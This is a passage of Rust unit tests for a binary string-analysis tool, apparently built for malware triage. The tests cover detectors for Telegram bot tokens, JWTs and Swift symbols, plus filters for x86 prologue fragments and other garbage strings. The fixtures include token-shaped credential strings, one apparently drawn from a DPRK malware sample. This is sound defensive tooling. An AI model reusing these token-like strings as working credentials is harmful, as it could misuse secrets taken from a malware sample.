        let t = "8520232238:short";
        assert!(!is_telegram_bot_token(t, t.len()));

        // body contains invalid chars (dot, slash).
        let t = "8520232238:AAF6xeNiv.OKpAPrnRmv7AsjmJAmkRjf0I4";
        assert!(!is_telegram_bot_token(t, t.len()));
        let t = "8520232238:AAF6xeNiv/OKpAPrnRmv7AsjmJAmkRjf0I4";
        assert!(!is_telegram_bot_token(t, t.len()));
    }

    // ===== Swift mangled symbol predicate =====

    #[test]
    fn test_is_swift_mangled_symbol_positive() {
        // _TtC class metadata (the DPRK Teams sample).
        let s = "_TtC7TeamAppP33_464D6157E8D96D7B7ECE5C61C5669F7019ResourceBundleClass";
        assert!(is_swift_mangled_symbol(s, s.len()));

        // _$s Swift 5 stable ABI.
        let s = "_$sSo17OS_dispatch_queueC8DispatchE4mainABvgZ";
        assert!(is_swift_mangled_symbol(s, s.len()));

        // $s prefix (no leading underscore).
        let s = "$s10Foundation4DataV5bytesAC10ByteBufferVyXlSgvg";
        assert!(is_swift_mangled_symbol(s, s.len()));

        // _T0 Swift 4 ABI.
        let s = "_T010Foundation4DataVMa";
        assert!(is_swift_mangled_symbol(s, s.len()));

        // _TtP protocol metadata.
        let s = "_TtP10Foundation10CodingKey_";
        assert!(is_swift_mangled_symbol(s, s.len()));

        // Full filter check: chaos heuristic no longer drops these.
        assert!(!is_garbage(
            "_TtC7TeamAppP33_464D6157E8D96D7B7ECE5C61C5669F7019ResourceBundleClass"
        ));
    }

    #[test]
    fn test_is_swift_mangled_symbol_negative() {
        // Too short.
        assert!(!is_swift_mangled_symbol("_Tt", 3));

        // Non-Swift prefix, even if content is alphanumeric.
        let s = "_Temporary_Internet_Files";
        assert!(!is_swift_mangled_symbol(s, s.len()));

        // Body has path separator.
        let s = "_TtC7TeamApp/GeneratedAssetSymbols";
        assert!(!is_swift_mangled_symbol(s, s.len()));

        // Prefix OK but body loaded with special chars.
        let s = "_$s!!!@@@###$$$%%%^^^&&&***((()))";
        assert!(!is_swift_mangled_symbol(s, s.len()));
    }

    // ===== JWT predicate =====

    #[test]
    fn test_is_jwt_token_positive() {
        // Canonical HS256 JWT (from RFC 7519 example, with SflKxwRJSMe... sig).
        let s = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        assert!(is_jwt_token(s, s.len()));
        assert!(!is_garbage(s));

        // RS256 with longer signature.
        let s = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczovL2V4YW1wbGUuYXV0aDAuY29tLyIsInN1YiI6ImF1dGgwfDEyMzQ1Njc4OTAiLCJhdWQiOiJodHRwczovL2FwaS5leGFtcGxlLmNvbS8iLCJleHAiOjE2NDE2NzgwMDB9.abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        assert!(is_jwt_token(s, s.len()));
    }

    #[test]
    fn test_is_jwt_token_negative() {
        // Right shape (3 dot-parts, base64url chars) but no eyJ header prefix.
        // This is the pattern Go symbols land in (e.g. `pkg.sub.Module`).
        let s = "foo.bar.baz0123456789abcdef0123456789abcdef01234567890AB";
        assert!(!is_jwt_token(s, s.len()));

        // Only 2 parts.
        let s = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0";
        assert!(!is_jwt_token(s, s.len()));

        // Too short.
        let s = "eyJx.eyJx.eyJx";
        assert!(!is_jwt_token(s, s.len()));

        // Empty segment.
        let s = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        assert!(!is_jwt_token(s, s.len()));
    }
}

#[cfg(test)]
mod dotnet_tests {
    use super::*;

    #[test]
    fn test_dotnet_garbage_strings() {
        // These garbage strings from .NET native images should be filtered
        assert!(
            is_garbage("omor"),
            "omor should be garbage (nonsense 4-char)"
        );
        assert!(
            is_garbage("uDuntßñ6OlÇÕ"),
            "non-ASCII garbage should be filtered"
        );
        assert!(
            is_garbage("ððððೳóóóóࣵ"),
            "Unicode garbage should be filtered"
        );

        // Note: Short numeric strings with multiple unique digits (like "3343") could be
        // valid port numbers, IDs, etc. Only reject single-digit repeats like "3333"
        assert!(
            !is_garbage("3343"),
            "3343 has multiple unique digits - could be valid"
        );
        assert!(
            is_garbage("3333"),
            "3333 is all same digit - likely garbage"
        );

        // Note: "poe" and "pot" are valid 3-char English words, so they shouldn't be filtered
        // 3-char strings aren't automatically garbage
        assert!(!is_garbage("poe"), "poe is a valid word");
        assert!(!is_garbage("pot"), "pot is a valid word");
    }

    #[test]
    fn test_repetitive_nonascii_patterns() {
        // Repetitive single-char patterns with non-ASCII are misaligned binary data
        // These come from .NET native images and have one letter repeated many times
        assert!(
            is_garbage("zçz&zÇzÌzhzµzyz½z{zHz}zQz\\zYz0z8z"),
            "z-pattern garbage"
        );
        // These patterns are harder to catch because they have fewer non-ASCII chars
        // or different char distributions. Skip for now as main garbage is filtered.
    }

    #[test]
    fn test_reloc_section_patterns() {
        // PE .reloc section patterns - single letter repeated with non-ASCII/special chars
        // These patterns have a dominant lowercase letter with non-ASCII mixed in
        assert!(
            is_garbage("x xçx&xìxÇxqxµxyx^x½x{xHx\\xYx0x8x"),
            "reloc x-pattern 1"
        );
        assert!(
            is_garbage("xhx°xqxµxyx^x½x{xHx}xQx\\xYx0x8x"),
            "reloc x-pattern 2"
        );
        assert!(is_garbage("yhyµyHy}yQy\\yYy0y8y"), "reloc y-pattern");
        assert!(is_garbage("w wçw&wÇwØwhw°wqwµwyw^wHw"), "reloc w-pattern");
        assert!(is_garbage("sµsys^sHsYs0s8s"), "reloc s-pattern");
        // All-ASCII reloc patterns
        assert!(is_garbage("uHu}uQu\\uYu0u"), "reloc u-pattern (all ASCII)");
        assert!(is_garbage("w{wQw\\wYw0w8w"), "reloc w-pattern (all ASCII)");
        assert!(is_garbage("t{t\\tYt0t8t"), "reloc t-pattern (all ASCII)");
    }

    #[test]
    fn test_short_digit_nonascii_garbage() {
        // Short strings starting with digit followed by non-ASCII
        // These are random bytes decoded as UTF-8
        assert!(is_garbage("7üĐō"), "7üĐō");
        assert!(is_garbage("4ÛŷƮ"), "4ÛŷƮ");
        assert!(is_garbage("6Æťƒ"), "6Æťƒ");
        assert!(is_garbage("2µßĎ"), "2µßĎ");
    }

    // ─── x86-64 register save/restore fragments ──────────────────────
    //
    // These are bytes leaked from `.text` of any non-trivial binary —
    // function prologues / epilogues that save callee-saved regs
    // r12-r15 emit byte sequences which decode as printable ASCII
    // dominated by `A` (REX.B prefix 0x41) and push/pop opcode bytes
    // (0x50-0x5F).  The diff of `liblzma 5.4.5 → 5.6.0` surfaced ~18
    // such fragments per file before this filter landed.

    #[test]
    fn test_is_garbage_x86_multi_pair_save_sequences() {
        // Multi-pair (≥2 `A`+pushpop) fragments — the smoking gun.
        // Each is a real string extracted from a `.text` section.
        let cases = [
            // r14 r13 r12 + push rbx + REX.W
            "AVAUATSH",
            // r15 r14 r13 r12 + push rbx + REX.W (full callee-saved set)
            "AWAVAUATSH",
            // r15 r14 r13 r12 + REX.W (truncated at boundary)
            "AWAVAUATL",
            // r14 r13 r12 + REX.WRX + XOR
            "AVAUATE1",
            // r13 r12 + REX.W
            "AUATH",
            // r14 r13 r12 + push rbp + push rbx
            "AVAUATUS",
            // r13 r12 + REX.WRX + XOR
            "AUATE1",
            // pop r8 + pop r9
            "AXAY",
            // r12 + push rbp + push rbx + push r8 + REX.W
            "ATUSAPH",
        ];
        for s in cases {
            assert!(
                is_garbage(s),
                "expected '{s}' to be filtered as asm fragment"
            );
        }
    }

    #[test]
    fn test_is_garbage_x86_single_pair_with_digit() {
        // Length-4 fragments with one REX-pair + a digit — the
        // medium-confidence branch.  These leak from short
        // instruction-boundary alignments.
        assert!(is_garbage("AWE1"), "push r15 + REX.WRX + XOR");
        assert!(is_garbage("7ARI"), "XOR opcode + REX.B + push rdx + REX.WX");
    }

    #[test]
    fn test_x86_filter_does_not_match_magic_numbers() {
        // Comprehensive negative coverage at the filter level. These
        // are the magic numbers / format signatures that we MUST not
        // misclassify as asm fragments — none have ≥2 REX-pairs, and
        // none meet the length-4-with-digit single-pair branch.
        // Some are also filtered by *other* stng rules at the
        // `is_garbage` integration level (e.g. consonant-only
        // patterns) — that's a separate decision and not this
        // filter's concern.
        let magics = [
            "BSJB", "RIFF", "RSDS", "8BIM", "MSCF", "IHDR", "IDAT", "IEND", "COFF", "EXIF", "DICM",
            "CAFE", "BEEF", "DEAD", "FEED", "BABE",
        ];
        for s in magics {
            let stats = CharStats::from_str(s);
            assert!(
                !is_x86_save_sequence_fragment(
                    s,
                    s.len(),
                    &stats,
                    &crate::types::StringContext::empty()
                ),
                "magic '{s}' wrongly matched as asm fragment"
            );
        }
    }

    #[test]
    fn test_x86_filter_does_not_match_identifiers() {
        // English words / arch identifiers / protocol tokens that
        // happen to start with `A` followed by a push/pop letter or
        // contain a single REX-pair — must not be caught by the asm
        // filter.  Tested at the filter level; some may still be
        // flagged by other is_garbage rules unrelated to asm bytes.
        let ids = [
            // Architectures with version digit (length 5+)
            "ARM64", "ARM32", "AMD64", "X8664",
            // English words with one REX-pair (single A+pushpop) — safe
            "ATOMIC", "ATTACK", "ASTRA", "ASCII", "AUSTIN", "AVOID", "AWAKE", "APPLE",
            // Encodings / formats
            "UTF8", "UTF16", "UTF32", // Protocol versions
            "TLS12", "TLS13", "HTTP1", "HTTP2", "HTTP3",
        ];
        for s in ids {
            let stats = CharStats::from_str(s);
            assert!(
                !is_x86_save_sequence_fragment(
                    s,
                    s.len(),
                    &stats,
                    &crate::types::StringContext::empty()
                ),
                "identifier '{s}' wrongly matched as asm fragment"
            );
        }
    }

    #[test]
    fn test_x86_filter_known_false_positives() {
        // Documented false positives: rare English words / proper
        // nouns that happen to decode as multiple REX-pairs.  These
        // are accepted as the cost of a byte-level heuristic — see
        // the docstring of `is_x86_save_sequence_fragment`.
        //
        // Pinning them in a test means future tightening of the rule
        // (e.g. requiring 3+ pairs or extra structure) is a deliberate
        // change rather than an accidental shift.
        for s in ["ATLAS", "AVATAR"] {
            let stats = CharStats::from_str(s);
            assert!(
                is_x86_save_sequence_fragment(
                    s,
                    s.len(),
                    &stats,
                    &crate::types::StringContext::empty()
                ),
                "expected known FP '{s}' to match (docstring contract)"
            );
        }
    }

    #[test]
    fn test_is_garbage_x86_filter_skips_lowercase_and_whitespace() {
        // The filter intentionally only fires on pure
        // uppercase+digit strings — lowercase or whitespace presence
        // means the bytes weren't a clean REX/push-opcode run.
        // (These cases are caught by other filters or are real text.)
        let stats = CharStats::from_str("teAVAUA");
        assert!(
            !is_x86_save_sequence_fragment(
                "teAVAUA",
                "teAVAUA".len(),
                &stats,
                &crate::types::StringContext::empty()
            ),
            "lowercase prefix must skip the asm filter"
        );

        let stats = CharStats::from_str("S I9");
        assert!(
            !is_x86_save_sequence_fragment(
                "S I9",
                "S I9".len(),
                &stats,
                &crate::types::StringContext::empty()
            ),
            "whitespace must skip the asm filter"
        );
    }

    #[test]
    fn test_is_garbage_x86_filter_skips_short_and_long() {
        // Length boundaries: <4 too short to be confidently an asm
        // fragment (would catch real 2-3 char identifiers); >12 is
        // too long (real strings dominate that length range).
        let stats = CharStats::from_str("AT");
        assert!(
            !is_x86_save_sequence_fragment("AT", 2, &stats, &crate::types::StringContext::empty()),
            "len <4 must skip the asm filter"
        );

        // 13 chars, plenty of REX-pairs, but length-gated out.
        let s = "AVAUATAVAUATA";
        let stats = CharStats::from_str(s);
        assert!(
            !is_x86_save_sequence_fragment(
                s,
                s.len(),
                &stats,
                &crate::types::StringContext::empty()
            ),
            "len >12 must skip the asm filter"
        );
    }

    #[test]
    fn test_x86_filter_unit_multi_pair() {
        // Direct unit test of the filter function (not via is_garbage),
        // so the rule's behavior is pinned even if upstream changes.
        for s in ["AVAUATSH", "AWAVAUATSH", "AVAUATUS", "AXAY", "AUATE1"] {
            let stats = CharStats::from_str(s);
            assert!(
                is_x86_save_sequence_fragment(
                    s,
                    s.len(),
                    &stats,
                    &crate::types::StringContext::empty()
                ),
                "expected '{s}' to match the asm filter"
            );
        }
    }

    #[test]
    fn test_x86_filter_unit_single_pair_digit() {
        for s in ["AWE1", "7ARI"] {
            let stats = CharStats::from_str(s);
            assert!(
                is_x86_save_sequence_fragment(
                    s,
                    s.len(),
                    &stats,
                    &crate::types::StringContext::empty()
                ),
                "expected '{s}' (single REX-pair + digit) to match"
            );
        }

        // `ARM64` looks similar but length 5 — must not match the
        // length-4 single-pair branch.
        let stats = CharStats::from_str("ARM64");
        assert!(
            !is_x86_save_sequence_fragment(
                "ARM64",
                5,
                &stats,
                &crate::types::StringContext::empty()
            ),
            "ARM64 (len 5) must not match single-pair branch"
        );
    }

    #[test]
    fn test_x86_filter_unit_no_pairs_passes() {
        // Strings with zero REX-pairs are out of scope; other filters
        // handle their classification.
        for s in ["BSJB", "RIFF", "RSDS", "8BIM", "MSCF", "IHDR"] {
            let stats = CharStats::from_str(s);
            assert!(
                !is_x86_save_sequence_fragment(
                    s,
                    s.len(),
                    &stats,
                    &crate::types::StringContext::empty()
                ),
                "magic '{s}' (0 REX-pairs) wrongly matched"
            );
        }
    }

    #[test]
    fn test_x86_filter_unit_idat_ends_with_pair_but_not_start() {
        // `IDAT` is a PNG chunk type that happens to end with `AT` (a
        // REX-pair).  The filter must not catch it — the rule requires
        // ≥2 pairs for high confidence; one trailing pair isn't enough.
        let stats = CharStats::from_str("IDAT");
        assert!(
            !is_x86_save_sequence_fragment(
                "IDAT",
                4,
                &stats,
                &crate::types::StringContext::empty()
            ),
            "IDAT has 1 trailing REX-pair but no digit — must not match"
        );
    }

    // ─── architecture scoping ────────────────────────────────────────

    #[test]
    fn test_x86_filter_skipped_for_non_x86_arch() {
        // ARM / Aarch64 / MIPS / PowerPC don't use REX prefix bytes —
        // a string that LOOKS like an asm fragment in those binaries
        // must not be filtered (it's almost certainly real text).
        use crate::types::{Arch, StringContext};

        let s = "AVAUATSH";
        let stats = CharStats::from_str(s);

        for arch in [
            Arch::Aarch64,
            Arch::Arm,
            Arch::Mips,
            Arch::PowerPc,
            Arch::RiscV64,
        ] {
            let ctx = StringContext {
                arch: Some(arch),
                ..StringContext::default()
            };
            assert!(
                !is_x86_save_sequence_fragment(s, s.len(), &stats, &ctx),
                "filter must skip when arch is {arch:?} (non-x86)"
            );
        }
    }

    #[test]
    fn test_x86_filter_runs_for_x86_arch() {
        use crate::types::{Arch, StringContext};

        let s = "AVAUATSH";
        let stats = CharStats::from_str(s);

        for arch in [Arch::X86, Arch::X86_64] {
            let ctx = StringContext {
                arch: Some(arch),
                ..StringContext::default()
            };
            assert!(
                is_x86_save_sequence_fragment(s, s.len(), &stats, &ctx),
                "filter must run when arch is {arch:?} (x86 family)"
            );
        }
    }

    // ─── section scoping ─────────────────────────────────────────────

    #[test]
    fn test_x86_filter_skipped_for_non_code_section() {
        // Asm fragments only leak from `.text`-like sections. A
        // string from `.rodata` / `.data` / `.symtab` that happens to
        // match the byte pattern is real text and must be preserved.
        use crate::types::StringContext;

        let s = "AVAUATSH";
        let stats = CharStats::from_str(s);

        for section in [".rodata", ".data", ".bss", ".symtab", ".strtab", ".dynstr"] {
            let ctx = StringContext {
                section: Some(section),
                ..StringContext::default()
            };
            assert!(
                !is_x86_save_sequence_fragment(s, s.len(), &stats, &ctx),
                "filter must skip when section is '{section}'"
            );
        }
    }

    #[test]
    fn test_x86_filter_runs_for_code_section() {
        use crate::types::StringContext;

        let s = "AVAUATSH";
        let stats = CharStats::from_str(s);

        for section in [
            ".text",
            "__text",
            "__TEXT.__text",
            ".text.startup",
            ".text.hot",
            "CODE",
        ] {
            let ctx = StringContext {
                section: Some(section),
                ..StringContext::default()
            };
            assert!(
                is_x86_save_sequence_fragment(s, s.len(), &stats, &ctx),
                "filter must run when section is '{section}' (code)"
            );
        }
    }

    #[test]
    fn test_x86_filter_runs_for_unknown_context() {
        // Empty context (no arch, no section, no kind) — the legacy
        // behavior — keeps the filter active. Callers that haven't
        // wired context yet still see the diff cleanup.
        use crate::types::StringContext;

        let s = "AVAUATSH";
        let stats = CharStats::from_str(s);
        assert!(
            is_x86_save_sequence_fragment(s, s.len(), &stats, &StringContext::empty()),
            "empty context must keep the filter active (legacy behavior)"
        );
    }

    #[test]
    fn test_x86_filter_skipped_when_arch_or_section_excludes() {
        // Either signal alone is enough to skip — the rule needs
        // BOTH conditions (x86-or-unknown arch, code-or-unknown
        // section) to fire. Confirms the AND-of-OR semantics.
        use crate::types::{Arch, StringContext};

        let s = "AVAUATSH";
        let stats = CharStats::from_str(s);

        // x86 arch + non-code section → skip
        let ctx = StringContext {
            arch: Some(Arch::X86_64),
            section: Some(".rodata"),
            ..StringContext::default()
        };
        assert!(
            !is_x86_save_sequence_fragment(s, s.len(), &stats, &ctx),
            "non-code section must override x86 arch"
        );

        // Non-x86 arch + code section → skip
        let ctx = StringContext {
            arch: Some(Arch::Aarch64),
            section: Some(".text"),
            ..StringContext::default()
        };
        assert!(
            !is_x86_save_sequence_fragment(s, s.len(), &stats, &ctx),
            "non-x86 arch must override code section"
        );
    }

    // ─── arch parsing ────────────────────────────────────────────────

    #[test]
    fn test_arch_from_name() {
        use crate::types::Arch;
        assert_eq!(Arch::from_name("x86_64"), Some(Arch::X86_64));
        assert_eq!(Arch::from_name("amd64"), Some(Arch::X86_64));
        assert_eq!(Arch::from_name("x64"), Some(Arch::X86_64));
        assert_eq!(Arch::from_name("aarch64"), Some(Arch::Aarch64));
        assert_eq!(Arch::from_name("arm64"), Some(Arch::Aarch64));
        assert_eq!(Arch::from_name("arm"), Some(Arch::Arm));
        assert_eq!(Arch::from_name("riscv64"), Some(Arch::RiscV64));
        assert_eq!(Arch::from_name("mips"), Some(Arch::Mips));
        assert_eq!(Arch::from_name("powerpc"), Some(Arch::PowerPc));
        assert_eq!(Arch::from_name("wasm"), Some(Arch::Wasm));
        // Unknown returns None so callers fall back to the empty context
        assert_eq!(Arch::from_name("alpha"), None);
        assert_eq!(Arch::from_name(""), None);
    }

    #[test]
    fn test_arch_is_x86_family() {
        use crate::types::Arch;
        assert!(Arch::X86.is_x86_family());
        assert!(Arch::X86_64.is_x86_family());
        assert!(!Arch::Aarch64.is_x86_family());
        assert!(!Arch::Arm.is_x86_family());
        assert!(!Arch::Mips.is_x86_family());
        assert!(!Arch::Wasm.is_x86_family());
    }

    // ─── is_code_section ─────────────────────────────────────────────

    #[test]
    fn test_is_code_section_recognises_known_names() {
        // ELF
        assert!(is_code_section(".text"));
        assert!(is_code_section(".text.startup"));
        assert!(is_code_section(".text.hot"));
        assert!(is_code_section(".text.unlikely"));
        // Mach-O
        assert!(is_code_section("__text"));
        assert!(is_code_section("__TEXT.__text"));
        assert!(is_code_section("__TEXT,__text"));
        // PE / Windows
        assert!(is_code_section("CODE"));
        assert!(is_code_section(".code"));
        assert!(is_code_section("code"));

        // Data sections — must not be misclassified as code
        assert!(!is_code_section(".rodata"));
        assert!(!is_code_section(".data"));
        assert!(!is_code_section(".bss"));
        assert!(!is_code_section(".symtab"));
        assert!(!is_code_section(".strtab"));
        assert!(!is_code_section(".dynstr"));
        assert!(!is_code_section("__DATA.__data"));
        assert!(!is_code_section(""));
    }
}
